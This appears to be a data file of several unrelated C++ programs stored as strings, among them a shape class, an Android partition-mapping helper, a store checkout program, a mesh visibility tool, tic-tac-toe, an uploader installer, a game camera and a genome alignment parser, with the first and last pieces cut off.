\u00e2\u00fb\u00e4\u00e4\u00e5\u00eb\u00e5\u00ed\u00e8\u00e5 \u00ef\u00e0\u00ec\u00ff\u00f2\u00e8 \u00ef\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2 \u00f2\u00ee\u00f7\u00e5\u00ea\n\t\tobj = new Point[count];\n\t\tif (!obj) exit(0);\n\n\t\t//\u00f3\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00ea\u00e0 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2 \u00f2\u00ee\u00f7\u00e5\u00ea\n\t\tint tempX, tempY;\n\t\tfor (int i = 0; i < count; i++) {\n\t\t\tcout << \"Set X\\n\";\n\t\t\tcin >> tempX;\n\t\t\tcout << \"Set Y\\n\";\n\t\t\tcin >> tempY;\n\t\t\tobj[i].SetPoint(tempX, tempY);\n\t\t}\n\t}\n\n\t//\u00ef\u00ee\u00ea\u00e0\u00e7 \u00f4\u00e8\u00e3\u00f3\u00f0\u00fb\n\tvoid ShowFigura() {\n\t\tcout << \"----------------------------\\n\\n\";\n\t\tcout << \"Color\" << color << \"\\n\\nPoints - \" << count << \"\\n\\n\";\n\t\tfor (int i = 0; i < count; i++) {\n\t\t\tobj[i].Show();\n\t\t}\n\t}\n\n\t//\u00e5\u00f1\u00eb\u00e8 \u00f4\u00e8\u00e3\u00f3\u00f0\u00e0 \u00e1\u00fb\u00eb\u00e0 \u00ee\u00f7\u00e8\u00f1\u00f2\u00e8\u00f2\u00fc \u00ef\u00e0\u00ec\u00ff\u00f2\u00fc\n\t~Figura() {\n\t\tif (obj != NULL) delete[]obj;\n\t}\n\n\n};\n\nclass Composition\n{\n\tFigura* obj;\n\tint count;\npublic:\n\tComposition()\n\t{\n\t\tobj = NULL;\n\t\tcount = 0;\n\t}\n\t~Composition()\n\t{\n\t\tif (obj)\n\t\t\tdelete [] obj;\n\t}\n\tvoid addFigura(int c)\n\t{\n\t\tcount = c;\n\t\tobj = new Figura[count];\n\t\tfor (int i=0; i<count; i++)\n\t\t{\n\t\t\tint col, num;\n\t\t\tcout << \"enter color of figure on number of points to create it -> \" << endl;\n\t\t\tcin >> col >> num;\n\t\t\t(obj+i)->CreateFigura(col, num);\n\t\t}\n\t}\n\tvoid showComposition() const\n\t{\n\t\tfor (int i=0; i<count; i++)\n\t\t\t(obj+i)->ShowFigura();\n\t}\n};\n\nvoid main() {\n\n\t//Figura f;\n\t//f.CreateFigura(255, 3);\n\t//f.ShowFigura();\n\tComposition c;\n\tc.addFigura(3);\n\tc.showComposition();\n\n}\n\n\n",
    "#include <fcntl.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <time.h>\n#include <unistd.h>\n\n#include <chrono>\n#include <ctime>\n#include <iostream>\n#include <map>\n#include <thread>\n\n#include <android-base/file.h>\n#include <android-base/strings.h>\n#include <android-base/unique_fd.h>\n#include <libdm/dm.h>\n#include <log/log.h>\n\nusing namespace std::literals::string_literals;\nusing namespace android::dm;\n\n#define NAME_PL_A \"pl_a\"\n#define NAME_PL_B \"pl_b\"\n\n#define UFS_PL_A \"/dev/block/sda\"\n#define UFS_PL_B \"/dev/block/sdb\"\n#define UFS_DEV \"/sys/class/block/sda/uevent\"\n#define LINK_PL_A \"/dev/block/by-name/preloader_raw_a\"\n#define LINK_PL_B \"/dev/block/by-name/preloader_raw_b\"\n#define LINK1_PL_A \"/dev/block/platform/bootdevice/by-name/preloader_raw_a\"\n#define LINK1_PL_B \"/dev/block/platform/bootdevice/by-name/preloader_raw_b\"\n#define DM_BLK_SIZE (512)\n\n#define PLHEAD \"MMM\"\n#define UFSHEAD \"UFS\"\n#define EMMCHEAD \"EMMC\"\n#define COMBOHEAD \"COMB\"\n#define EMMCHSZ (0x800)\n#define UFSHSZ (0x1000)\n#define BLKSZ (512)\n\nstatic int create_dm(const char* device, const char* name, std::string* path, int start_blk,\n                     int blk_cnt) {\n  DmTable table;\n  std::unique_ptr<DmTarget> target;\n\n  if (!device || !name) {\n    ALOGE(\"%s device or name is null\\n\", __func__);\n    return 1;\n  }\n\n  ALOGD(\"create_dm dev: %s, name %s, start %d, blks %d\\n\", device, name, start_blk, blk_cnt);\n  target = std::make_unique<DmTargetLinear>(0, blk_cnt, device, start_blk);\n  if (!table.AddTarget(std::move(target))) {\n    ALOGE(\"Add target fail(%s)\", strerror(errno));\n    return 1;\n  }\n  DeviceMapper& dm = DeviceMapper::Instance();\n  if (!dm.CreateDevice(name, table, path, std::chrono::milliseconds(500))) {\n    ALOGE(\"Create %s on %s fail(%s)\", name, device, strerror(errno));\n    return 1;\n  }\n  ALOGI(\"Create %s done\", (*path).c_str());\n  return 0;\n}\n\nstatic void create_pl_link(std::string link, std::string devpath) {\n  std::string link_path;\n\n  if (android::base::Readlink(link, &link_path) && link_path != devpath) {\n    ALOGE(\"Remove symlink %s links to: %s\", link.c_str(), link_path.c_str());\n    if (!android::base::RemoveFileIfExists(link))\n      ALOGE(\"Cannot remove symlink %s\", strerror(errno));\n  }\n\n  if (symlink(devpath.c_str(), link.c_str()))\n    ALOGE(\"Failed to symlink %s to %s (%s)\", devpath.c_str(), link.c_str(), strerror(errno));\n}\n\nint create_pl_path(void) {\n  int start_blk, blk_cnt, fd;\n  off_t pl_size;\n  char header_desc[5];\n  std::string path_a, path_b, link_path, dev_path, link;\n  DeviceMapper& dm = DeviceMapper::Instance();\n  ssize_t sz = 0;\n\n  \n  fd = open(UFS_PL_A, O_RDONLY);\n  if (fd < 0) {\n    ALOGE(\"Cannot open %s (%s)\", UFS_PL_A, strerror(errno));\n    return 1;\n  }\n\n  pl_size = lseek(fd, 0, SEEK_END);\n  if (pl_size < 0) {\n    ALOGE(\"lseek fail (%s)\", strerror(errno));\n    close(fd);\n    return 1;\n  }\n\n  ALOGD(\"pl_size: %ld\\n\", pl_size);\n  blk_cnt = pl_size / DM_BLK_SIZE;\n\n  if (lseek(fd, 0, SEEK_SET)) {\n    ALOGE(\"lseek to head fail(%s)\\n\", strerror(errno));\n    close(fd);\n    return 1;\n  }\n\n  if ((sz = read(fd, header_desc, sizeof(header_desc))) < 0) {\n    ALOGE(\"read fail(%s)\", strerror(errno));\n    close(fd);\n    return 1;\n  }\n  if (sz != sizeof(header_desc)) ALOGE(\"%s size is not header_desc\\n\", __func__);\n\n  close(fd);\n\n  header_desc[sizeof(header_desc) - 1] = 0;\n  if (!strncmp(header_desc, EMMCHEAD, strlen(EMMCHEAD))) {\n    start_blk = EMMCHSZ / BLKSZ;\n  } else if (!strncmp(header_desc, UFSHEAD, strlen(UFSHEAD)) ||\n             !strncmp(header_desc, COMBOHEAD, strlen(COMBOHEAD))) {\n    start_blk = UFSHSZ / BLKSZ;\n  } else {\n    ALOGE(\"Invalid header %s\", header_desc);\n    return 1;\n  }\n\n  blk_cnt -= start_blk;\n  \n  if (create_dm(UFS_PL_A, NAME_PL_A, &path_a, start_blk, blk_cnt) != 0) {\n    return 1;\n  }\n  if (create_dm(UFS_PL_B, NAME_PL_B, &path_b, start_blk, blk_cnt) != 0) {\n    if (dm.DeleteDevice(UFS_PL_A))\n      ALOGE(\"Cannot delete device %s (%s)\", NAME_PL_A, strerror(errno));\n    return 1;\n  }\n  \n\n  create_pl_link(LINK_PL_A, path_a);\n  create_pl_link(LINK_PL_B, path_b);\n  create_pl_link(LINK1_PL_A, path_a);\n  create_pl_link(LINK1_PL_B, path_b);\n  return 0;\n}\n\nint main(void) {\n  return create_pl_path();\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <string>\n\nusing namespace std;\n\n// Definic\u00e3o da estrutura Item\nstruct Item {\n    int id;\n    string nome;\n    double valor;\n    int estoque;\n};\n\n// Definic\u00e3o da estrutura CarrinhoItem\nstruct CarrinhoItem {\n    Item item;\n    int quantidade;\n};\n\n// Func\u00e3o para ler o arquivo CSV e adicionar os dados \u00e0 estrutura\nvoid LeArquivo(const string& caminhoArquivo, vector<Item>& itens) {\n    ifstream arquivo(caminhoArquivo);\n    string linha;\n\n    // Ignorar a primeira linha (cabecalhos)\n    getline(arquivo, linha);\n\n    // Ler o arquivo linha por linha\n    while (getline(arquivo, linha)) {\n        istringstream stream(linha);\n        string campo;\n        Item item;\n\n        // Ler o id\n        getline(stream, campo, ',');\n        item.id = stoi(campo);\n\n        // Ler o nome\n        getline(stream, campo, ',');\n        item.nome = campo;\n\n        // Ler o valor\n        getline(stream, campo, ',');\n        item.valor = stod(campo);\n\n        // Ler o estoque\n        getline(stream, campo, ',');\n        item.estoque = stoi(campo);\n\n        // Adicionar o item ao vetor\n        itens.push_back(item);\n    }\n}\n\n// Func\u00e3o para exibir o estoque\nvoid ExibirEstoque(const vector<Item>& itens) {\n    cout << \"Bem-vindo(a) a Papelaria Ideal!\\n========== Estoque ==========\" << endl;\n    for (const Item& item : itens) {\n        cout << item.id << \". \" << item.nome << \": Preco R$ \" << item.valor << \" | Estoque: \" << item.estoque << endl;\n    }\n}\n\n// Func\u00e3o para exibir os detalhes de uma compra\nvoid ExibirCompra(const CarrinhoItem& carrinhoItem) {\n    cout << \"Item: \" << carrinhoItem.item.nome << \" | Quantidade: \" << carrinhoItem.quantidade \n         << \" | Preco unitario: R$ \" << carrinhoItem.item.valor << \" | Subtotal: R$ \" << carrinhoItem.item.valor * carrinhoItem.quantidade << endl;\n}\n\n// Func\u00e3o para exibir o carrinho\nvoid ExibirCarrinho(const vector<CarrinhoItem>& carrinho) {\n    cout << \"\\n========== Cupom Fiscal ==========\\n\";\n    double total = 0.0;\n    for (const CarrinhoItem& carrinhoItem : carrinho) {\n        cout << \"Item: \" << carrinhoItem.item.nome << \" | Quantidade: \" << carrinhoItem.quantidade \n             << \" | Preco unitario: R$ \" << carrinhoItem.item.valor << \" | Subtotal: R$ \" << carrinhoItem.item.valor * carrinhoItem.quantidade << endl;\n        total += carrinhoItem.item.valor * carrinhoItem.quantidade;\n    }\n    cout << \"\\nTotal da compra: R$ \" << total << endl;\n}\n\n// Func\u00e3o para atualizar o arquivo CSV com os itens comprados\nvoid AtualizaItens(const string& caminhoArquivo, const vector<Item>& itens) {\n    ofstream arquivo(caminhoArquivo);\n\n    // Escrever os cabecalhos\n    arquivo << \"id,nome,valor,estoque\\n\";\n\n    // Escrever cada item no arquivo\n    for (const Item& item : itens) {\n        arquivo << item.id << \",\" << item.nome << \",\" << item.valor << \",\" << item.estoque << \"\\n\";\n    }\n\n    arquivo.close();\n}\n\n// Func\u00e3o para cadastrar novos itens se o arquivo n\u00e3o existir\nvoid CadastrarDados(const string& caminhoArquivo) {\n    vector<Item> itens = {\n        {1, \"Caneta\", 1.50, 100},\n        {2, \"Lapis\", 0.75, 200},\n        {3, \"Borracha\", 0.50, 150},\n        {4, \"Caderno\", 5.00, 80},\n        {5, \"Marcador\", 2.00, 60},\n        {6, \"Tesoura\", 3.50, 50},\n        {7, \"Cola\", 1.00, 120},\n        {8, \"Papel A4\", 20.00, 40},\n        {9, \"Grampeador\", 15.00, 30},\n        {10, \"Calculadora\", 25.00, 20}\n    };\n\n    ofstream arquivo(caminhoArquivo);\n\n    // Escrever os cabecalhos\n    arquivo << \"id,nome,valor,estoque\\n\";\n\n    // Escrever cada item no arquivo\n    for (const Item& item : itens) {\n        arquivo << item.id << \",\" << item.nome << \",\" << item.valor << \",\" << item.estoque << \"\\n\";\n    }\n\n    arquivo.close();\n}\n\nint main() {\n    vector<Item> itens;\n    vector<CarrinhoItem> carrinho;\n    string caminhoArquivo = \"estoque.csv\";\n    int i = 0;\n\n    // Verificar se o arquivo existe\n    ifstream arquivo(caminhoArquivo);\n    if (!arquivo.good()) {\n        cout << \"Arquivo nao encontrado. Cadastrando novos dados...\\n\";\n        CadastrarDados(caminhoArquivo);\n    }\n    arquivo.close();\n\n    // Ler o arquivo e preencher o vetor de itens\n    LeArquivo(caminhoArquivo, itens);\n\n    ExibirEstoque(itens);\n\n    cout << \"\\nIniciando compra...\\n\";\n\n    // Loop para adicionar itens ao carrinho\n    while (true) {\n        char saida;\n        int idItem;\n        int quantidade;\n\n        if (i != 0) {\n            ExibirEstoque(itens);\n        }\n\n        cout << \"\\nEscolha o numero do item que deseja comprar (1-10): \";\n        cin >> idItem;\n\n        cout << \"\\nDigite a quantidade que deseja comprar: \";\n        cin >> quantidade;\n\n        bool itemEncontrado = false;\n        for (Item& item : itens) {\n            if (item.id == idItem) {\n                itemEncontrado = true;\n                if (item.estoque >= quantidade) {\n                    item.estoque -= quantidade;\n                    cout << \"\\nItem adicionado ao carrinho com sucesso!\\n\";\n   ",
    "#include \"Visibility.h\"\r\n\r\n\r\n\r\n\r\nstd::vector<cinolib::vec3d>* Env::generate_viewpoints(uint cnt){\r\n    std::vector<cinolib::vec3d>* viewpoint= new std::vector<cinolib::vec3d>;\r\n    cnt *= 2;\r\n    for (uint i=0;i<cnt;i++){\r\n        double phi=acos(-1.0 + (2.0 * i - 1.0)/cnt);\r\n        double theta = sqrt(cnt * M_PI ) * phi;\r\n        double x = cos(theta) * sin(phi);\r\n        double y = sin(theta) * sin(phi);\r\n        double z = cos(phi);\r\n        if (z >= 0)\r\n            viewpoint->push_back(cinolib::vec3d(x, y, z));\r\n    }\r\n    return viewpoint;\r\n}\r\nstd::vector<cinolib::vec3d>* Env::scale_viewpoints(std::vector<cinolib::vec3d>* viewpoints, cinolib::vec3d center,double scale) {\r\n    for (uint i = 0; i < viewpoints->size(); i++) {\r\n        viewpoints->at(i) = viewpoints->at(i) * scale * 1.2;\r\n        viewpoints->at(i) = viewpoints->at(i) + center;\r\n    }\r\n    return viewpoints;\r\n}\r\ncinolib::vec3d Env::get_bottom_center(cinolib::DrawableTrimesh<> m) {\r\n    std::vector<cinolib::vec3d> vertexs = m.vector_verts();\r\n    double max_x = INT_MIN;\r\n    double min_x = INT_MAX;\r\n    double max_y = INT_MIN;\r\n    double min_y = INT_MAX;\r\n    double min_z = INT_MAX;\r\n    for (uint pid = 0; pid < vertexs.size(); pid++) {\r\n        max_x = std::max(max_x, vertexs[pid][0]);\r\n        min_x = std::min(min_x, vertexs[pid][0]);\r\n        max_y = std::max(max_y, vertexs[pid][1]);\r\n        min_y = std::min(min_y, vertexs[pid][1]);\r\n        min_z = std::min(min_z, vertexs[pid][2]);\r\n    }\r\n    return cinolib::vec3d((max_x + min_x) / 2, (max_y + min_y) / 2, min_z);\r\n}\r\ndouble Env::get_radius(cinolib::DrawableTrimesh<> m) {\r\n    std::vector<cinolib::vec3d> vertexs = m.vector_verts();\r\n    double max_x = INT_MIN;\r\n    double min_x = INT_MAX;\r\n    double max_y = INT_MIN;\r\n    double min_y = INT_MAX;\r\n    double max_z = INT_MIN;\r\n    double min_z = INT_MAX;\r\n    for (uint pid = 0; pid < vertexs.size(); pid++) {\r\n        max_x = std::max(max_x, vertexs[pid][0]);\r\n        min_x = std::min(min_x, vertexs[pid][0]);\r\n        max_y = std::max(max_y, vertexs[pid][1]);\r\n        min_y = std::min(min_y, vertexs[pid][1]);\r\n        max_z = std::max(max_z, vertexs[pid][2]);\r\n        min_z = std::min(min_z, vertexs[pid][2]);\r\n    }\r\n    return (cinolib::vec3d((max_x + min_x) / 2, (max_y + min_y) / 2, min_z) - cinolib::vec3d(max_x, max_y, min_z)).norm();\r\n}\r\nstd::vector <std::vector<double>>* Env::get_visibility_score(cinolib::DrawableTrimesh<> m, unv::data_type type,int viewpoints_number,bool debug_mode) {\r\n    std::vector<std::vector<uint>> faces = m.vector_polys();\r\n    std::vector<cinolib::vec3d> vertexs = m.vector_verts();\r\n    std::vector<cinolib::vec3d> normals = m.vector_vert_normals();\r\n    \r\n    std::vector <std::vector<double>>* res_point_ab = new std::vector <std::vector<double>>;\r\n    std::vector<double> di(vertexs.size());\r\n    res_point_ab->push_back(di);\r\n    res_point_ab->push_back(di);\r\n    \r\n    \r\n\r\n    uint max_depth = 7;\r\n    uint items_per_leaf = 50;\r\n\r\n    //view points\r\n    std::vector<cinolib::vec3d>* viewpoints = generate_viewpoints(viewpoints_number);\r\n    cinolib::vec3d bottem_center = Env::get_bottom_center(m);\r\n    double radius = Env::get_radius(m);\r\n    viewpoints = Env::scale_viewpoints(viewpoints, bottem_center, radius);\r\n\r\n\r\n    cinolib::DrawableOctree octree(max_depth, items_per_leaf);\r\n    octree.debug_mode(debug_mode); // dump times and statistics\r\n    octree.build_from_mesh_polys(m);\r\n    uint all_block_num = viewpoints->size();\r\n#pragma omp parallel\r\n    {\r\n#pragma omp for\r\n        for (int vid = 0; vid < viewpoints->size(); vid++) {\r\n            printf(\"\\r[%d%%]>\", vid * 100 / (all_block_num - 1));\r\n            for (int j = 1; j <= vid * 40 / all_block_num; j++)\r\n                std::cout << \"\u2589\";\r\n            for (uint pid = 0; pid < vertexs.size(); pid++) {\r\n                cinolib::vec3d  dir = vertexs[pid] - viewpoints->at(vid);\r\n                double t;\r\n                uint   fid;\r\n                if (octree.intersects_ray(viewpoints->at(vid), dir, t, fid)) {\r\n                    if (faces[fid][0] == pid || faces[fid][1] == pid || faces[fid][2] == pid) {\r\n                        //pid\u53ef\u4ee5\u88ab\u770b\u89c1\uff0c\u547d\u4e2d\uff0c\u8ba1\u7b97\u6cd5\u5411\r\n                        if (normals[pid].dot(dir) > 0) {\r\n                            res_point_ab->at(0)[pid] = res_point_ab->at(0)[pid] + 1;\r\n                        }\r\n                        else {\r\n                            res_point_ab->at(1)[pid] = res_point_ab->at(1)[pid] + 1;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n    printf(\"\\n\");\r\n    if (type == unv::POINT_DATA) {\r\n        return unv::normalize(res_point_ab);\r\n    }\r\n    else {\r\n        std::vector <std::vector<double>>* res_face_ab = new std::vector <std::vector<double>>;\r\n        res_face_ab->push_back(*unv::point2face(res_point_ab->at(0), m));\r\n        res_face_ab->push_back(*unv::point2face(res_point_ab->at(1), m));\r\n        delete res_point_ab;\r\n        return unv::normalize(res_fac",
    "#include <iostream>\nusing namespace std;\n\nchar space[3][3] = {{'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'}};\nstring p1, p2;\nchar token = 'x';\nint row, column;\nbool draw = false;\n\nvoid f1()\n{\n    cout << \"   | \" << \"  | \" << '\\n';\n    cout << \" \" << space[0][0] << \" | \" << space[0][1] << \" | \" << space[0][2] << '\\n';\n    cout << \"___|\" << \"___|\" << \"___\" << '\\n';\n    cout << \"   | \" << \"  | \" << '\\n';\n    cout << \" \" << space[1][0] << \" | \" << space[1][1] << \" | \" << space[1][2] << '\\n';\n    cout << \"___|\" << \"___|\" << \"___\" << '\\n';\n    cout << \"   | \" << \"  | \" << '\\n';\n    cout << \" \" << space[2][0] << \" | \" << space[2][1] << \" | \" << space[2][2] << '\\n';\n    cout << \"   | \" << \"  | \" << '\\n';\n}\n\nvoid f2()\n{\n    int digit;\n\n    if (token == 'x')\n    {\n        cout << p1 << \" please enter : \";\n        cin >> digit;\n    }\n    else if (token == '0')\n    {\n        cout << p2 << \" please enter : \";\n        cin >> digit;\n    }\n\n    if (digit == 1)\n    {\n        row = 0;\n        column = 0;\n    }\n    else if (digit == 2)\n    {\n        row = 0;\n        column = 1;\n    }\n    else if (digit == 3)\n    {\n        row = 0;\n        column = 2;\n    }\n    else if (digit == 4)\n    {\n        row = 1;\n        column = 0;\n    }\n    else if (digit == 5)\n    {\n        row = 1;\n        column = 1;\n    }\n    else if (digit == 6)\n    {\n        row = 1;\n        column = 2;\n    }\n    else if (digit == 7)\n    {\n        row = 2;\n        column = 0;\n    }\n    else if (digit == 8)\n    {\n        row = 2;\n        column = 1;\n    }\n    else if (digit == 9)\n    {\n        row = 2;\n        column = 2;\n    }\n    else\n    {\n        cout << \"Invalid!!\" << '\\n';\n    }\n\n    if (token == 'x' && space[row][column] != 'x' && space[row][column] != '0')\n    {\n        space[row][column] = 'x';\n        token = '0';\n    }\n    else if (token == '0' && space[row][column] != 'x' && space[row][column] != '0')\n    {\n        space[row][column] = '0';\n        token = 'x';\n    }\n    else\n    {\n        cout << \"there is no empty space!\" << '\\n';\n    }\n}\n\nbool f3()\n{\n    for (int i = 0; i < 3; i++)\n    {\n        if ((space[i][0] == space[i][1] && space[i][0] == space[i][2]) || (space[0][i] == space[1][i] && space[0][i] == space[2][i]))\n        {\n            return true;\n        }\n    }\n    if ((space[0][0] == space[1][1] && space[0][0] == space[2][2]) || (space[2][0] == space[1][1] && space[2][0] == space[0][2]))\n    {\n        return true;\n    }\n\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            if (space[i][j] != 'x' && space[i][j] != '0')\n            {\n                return false;\n            }\n        }\n    }\n    draw = true;\n    return true;\n}\n\nint main()\n{\n\n    cout << \"Enter the name of first player : \";\n    getline(cin, p1);\n    cout << \"Enter the name of second player :\";\n    getline(cin, p2);\n    cout << p1 << \" is player1 so he/she will play first\\n\";\n    cout << p2 << \" is player2 so he/she will play second\\n\";\n\n    while (!f3())\n    {\n        f1();\n        f2();\n        f3();\n    }\n    f1();\n    if (token == '0' && draw == false)\n    {\n        cout << p1 << \" Wins\" << '\\n';\n    }\n    else if (token == 'x' && draw == false)\n    {\n        cout << p2 << \" Wins\" << '\\n';\n    }\n    else\n    {\n        cout << \"It's a Draw\" << '\\n';\n    }\n}",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n\nvoid runCommand(const std::string& command) {\n    int result = system(command.c_str());\n    if (result != 0) {\n        std::cerr << \"Command failed: \" << command << std::endl;\n        exit(1);\n    }\n}\n\nvoid installUploader() {\n    std::cout << \"Installing...\" << std::endl;\n\n    // Update package list\n    //runCommand(\"sudo apt-get update\");\n\n    // Install dependencies\n    //runCommand(\"sudo apt-get install -y python3 python3-requests\");\n\n\n    // Make the script executable\n    runCommand(\"chmod +rwx Files/upload_app\");\n    runCommand(\"chmod +rwx Files/get_gofile_server.py\");\n    runCommand(\"chmod +rwx Files/parse_json.py\");\n    runCommand(\"chmod +rwx Files/get_gofile_dlink.py\");\n    \n    // Move the script to a directory in the PATH\n    runCommand(\"sudo mv Files/upload_app /usr/local/bin/upload_app\");\n    runCommand(\"sudo mv Files/get_gofile_server.py /usr/local/bin/get_gofile_server.py\");\n    runCommand(\"sudo mv Files/parse_json.py /usr/local/bin/parse_json.py\"); \n    runCommand(\"sudo mv Files/get_gofile_dlink.py /usr/local/bin/get_gofile_dlink.py\");\n    \n\n    std::cout << \"Task-Force Uploader installed successfully!\" << std::endl;\n}\n\nint main() {\n    installUploader();\n    return 0;\n}\n",
    "#include \"stdafx.h\"\n#include \"..\\Public\\Camera_Debug.h\"\n\n#include \"GameInstance.h\"\n\nCCamera_Debug::CCamera_Debug(ID3D11Device * pDevice, ID3D11DeviceContext * pContext)\n\t: CCamera(pDevice, pContext)\n{\n\n}\n\nCCamera_Debug::CCamera_Debug(const CCamera_Debug & rhs)\n\t: CCamera(rhs)\n{\n\n}\n\nHRESULT CCamera_Debug::Initialize_Prototype()\n{\n\treturn S_OK;\n}\n\nHRESULT CCamera_Debug::Initialize(void * pArg)\n{\n\tCAMERA_DEBUG_DESC*\t\tpCamera_Debug_Desc = (CAMERA_DEBUG_DESC*)pArg;\n\n\tm_fMouseSensitive = pCamera_Debug_Desc->fMouseSensitive;\n\n\tif (FAILED(__super::Initialize(pArg)))\n\t\treturn E_FAIL;\n\n\treturn S_OK;\n}\n\nvoid CCamera_Debug::Tick(_float fTimeDelta)\n{\n\t\n\tCGameInstance*\tpGameInstance = GET_INSTANCE(CGameInstance);\n\t\n\n\tif (pGameInstance->Get_DIKeyState(DIK_A) & 0x80)\n\t{\n\t\tm_pTransform->Go_Left(fTimeDelta);\n\t}\n\tif (pGameInstance->Get_DIKeyState(DIK_D) & 0x80)\n\t{\n\t\tm_pTransform->Go_Right(fTimeDelta);\n\t}\n\tif (pGameInstance->Get_DIKeyState(DIK_W) & 0x80)\n\t{\n\t\tm_pTransform->Go_Straight(fTimeDelta);\n\t}\n\tif (pGameInstance->Get_DIKeyState(DIK_S) & 0x80)\n\t{\n\t\tm_pTransform->Go_Backward(fTimeDelta);\n\t}\n\n\t_long\tMouseMove = 0l;\n\n\tif (MouseMove = pGameInstance->Get_DIMouseMove(CInput_Device::MMS_X))\n\t{\n\t\tm_pTransform->Turn(XMVectorSet(0.f, 1.f, 0.f, 0.f), MouseMove * m_fMouseSensitive * fTimeDelta);\n\t}\n\n\tif (MouseMove = pGameInstance->Get_DIMouseMove(CInput_Device::MMS_Y))\n\t{\n\t\tm_pTransform->Turn(m_pTransform->Get_State(CTransform::STATE_RIGHT), MouseMove * m_fMouseSensitive * fTimeDelta);\n\t}\t\n\n\tRELEASE_INSTANCE(CGameInstance);\n\n\t__super::Tick(fTimeDelta);\n}\n\nvoid CCamera_Debug::LateTick(_float fTimeDelta)\n{\n}\n\nCCamera_Debug * CCamera_Debug::Create(ID3D11Device * pDevice, ID3D11DeviceContext * pContext)\n{\n\tCCamera_Debug*\tpInstance = new CCamera_Debug(pDevice, pContext);\n\n\tif (FAILED(pInstance->Initialize_Prototype()))\n\t{\n\t\tMSG_BOX(\"Failed to Created : CCamera_Debug\");\n\t\tSafe_Release(pInstance);\n\t}\n\n\treturn pInstance;\n}\n\nCGameObject * CCamera_Debug::Clone(void* pArg)\n{\n\tCCamera_Debug*\tpInstance = new CCamera_Debug(*this);\n\n\tif (FAILED(pInstance->Initialize(pArg)))\n\t{\n\t\tMSG_BOX(\"Failed to Cloned : CCamera_Debug\");\n\t\tSafe_Release(pInstance);\n\t}\n\n\treturn pInstance;\n}\n\nvoid CCamera_Debug::Free()\n{\n\t__super::Free();\n\n}\n",
    "\n#include<iostream>\n#include \"sv.h\"\n#include \"seqIO.h\"\n\nusing namespace std;\n\nusing chroms = map<string,chromPair>;\nusing ccov = vector<int>;\nusing vq = vector<qord>;\nint main(int argc, char *argv[])\n{\n\tif(argc <2)\n\t{\n\t\tcerr<<\"Usage: \"<<argv[0]<<\" foo.delta ref.fasta query.fasta cutoff mode(h/l) last_out.txt prefix\"<<endl;\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tchroms allChrom;\n\t\n\tmap<string,ccov> masterRef; //stores sequence coverage but it can also be used to find reference chromosome lengths\n\tmap<string,ccov>masterQ; //stores sequence coverage but it can also be used to find query chromosome lengths\n\tmap<string,ccov>masterHQ; //same as masterQ but records coverage only for homologous pairs\n\n\tmap<string,int> lookUpRef;//encodes reference names in integers to save space\n\tmap<string,int> lookUpQ;//same as above for query\n\n\tmap<string,ccov> chromDensityRef;//stores whether a position in ref maps to >2 queries\n\tmap<string,ccov> chromDensityQ;//stores whether a position in query maps to >2 refs\n\n\tmap<string,vector<string> > cp; //cp is an alias for Chromosome partner. Each reference name index has a vector of unqiue alignments which are part of these\n\tmap<string,vector<string> > hcp;//hcp stands for homologous cp\n\t\n\tmap<string,map<int,vq> > umRef;//stores the coordinates of unique reference to query map; requires re-reading the file\n\tmap<string,string> refseq;\n\tmap<string,string> qseq;\n\tmap<string,vector<int> > seqLen;//length of sequences.first element is ref and second is query\n\t\n\tmI tempmi,prevmi,nextmi,temprmi,tempmi2;\n\n\tstring foo = string(argv[1]);\n\tstring line, chromName,refName,qName,indexAln,fileName;\n\tint refStart = 0, refEnd = 0, qStart = 0, qEnd = 0, refLen =0, qLen =0, count = -1,qGap =0, indelPos =0, refChromCount=0, qChromCount = 0;\n\t//double avgDensity = 0;\n\tunsigned int index = 0;\n\t\n\tvector<double> vd(2),vn(2);\n\tvector<int> vi;\n\tvector<mI> vmi,tempVmi,vm,qvm,gapmi,mastermi,transmi,invmi;//mastermi holds all mums in a delta file\n\tsize_t pos1,pos2,namePos;\n\t\n\tifstream fin, refFasta, qFasta,flast;//flast for opening lastz output\n\tofstream fout,fcnv,fsmall,ftrans,findel,fcords,fcm;\n\tfin.open(argv[1]);\n\tfileName = \"cords.\"+string(argv[6])+\".txt\";\n\tfcords.open(fileName);\n\twhile(getline(fin,line))\n\t{\n\t\t\n\t\tif(line.find('>') != string::npos)//start of an aligning chromosome description\n\t\t{\n\t\t\t\t\t\t\n\t\t\trefName = line.substr(1,line.find(' ')-1);\n\t\t\tpos1 = line.find(' '); //position of the first space\n\t\t\tpos2 = line.find(' ',pos1+1);//position of the second space\n\t\t\tqName = line.substr(pos1+1, pos2-pos1-1); //up to the second space\n\t\t\tpos1 = line.find(' ',pos2+1); //recycling pos1 to find pos3\n\t\t\trefLen = stoi(line.substr(pos2+1,pos1-pos2));//reference length\n\t\t\tqLen = stoi(line.substr(pos1));//from last space till end \n\t\t\tindexAln = refName + qName;\n\t\t\tcount = -1;\n\t\t\tseqLen[indexAln].push_back(refLen);\n\t\t\tseqLen[indexAln].push_back(qLen);\n\t\t\tcp[refName].push_back(indexAln); //adding the alignment to the list of refName alignments\n\t\t\tif(lookUpRef[refName] == 0)\n\t\t\t{\n\t\t\t\tlookUpRef[refName] = ++refChromCount;\n\t\t\t}\n\t\t\tif(lookUpQ[qName] == 0)\n\t\t\t{\n\t\t\t\tlookUpQ[qName] = ++qChromCount;\n\t\t\t}\n\t\t\tif(masterRef[refName].size() == 0)//if they have not been created\n\t\t\t{\n\t\t\t\tmasterRef[refName] = makeChromBucket(refLen);\n\t\t\t\tchromDensityRef[refName] = makeChromBucket(refLen);\t\n\t\t\t}\n\t\t\tif(masterQ[qName].size() == 0)//if they have not been created\n\t\t\t{\n\t\t\t\tmasterQ[qName] = makeChromBucket(qLen);\n\t\t\t\tchromDensityQ[qName] = makeChromBucket(qLen);\n\t\t\t}\n\t\t}\n\t\tif((line.size() <10) && (refName != \"\") && (count > 